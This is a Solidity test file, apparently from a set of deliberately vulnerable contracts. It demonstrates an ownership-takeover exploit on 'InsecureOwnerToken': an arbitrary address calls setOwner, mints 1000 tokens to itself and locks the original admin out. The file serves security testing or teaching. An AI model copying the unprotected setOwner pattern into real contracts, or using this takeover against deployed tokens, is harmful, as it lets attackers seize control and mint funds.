// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/A17.sol";

contract A17Test is Test {
    InsecureOwnerToken token;
    address admin = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        vm.prank(admin);
        token = new InsecureOwnerToken();
    }

    function testOwnerTakeover() public {
        // 1. Verify original owner
        assertEq(token.owner(), admin);

        // 2. Attacker takes ownership
        vm.prank(attacker);
        token.setOwner(attacker);

        // 3. Verify ownership changed
        assertEq(token.owner(), attacker);

        // 4. Attacker can now mint tokens
        vm.prank(attacker);
        token.mint(attacker, 1000e18);
        assertEq(token.balanceOf(attacker), 1000e18);
    }

    function testAdminLockout() public {
        // 1. Attacker takes ownership
        vm.prank(attacker);
        token.setOwner(attacker);

        // 2. Original admin can no longer mint
        vm.prank(admin);
        vm.expectRevert("Only owner can mint");
        token.mint(admin, 100e18);
    }
}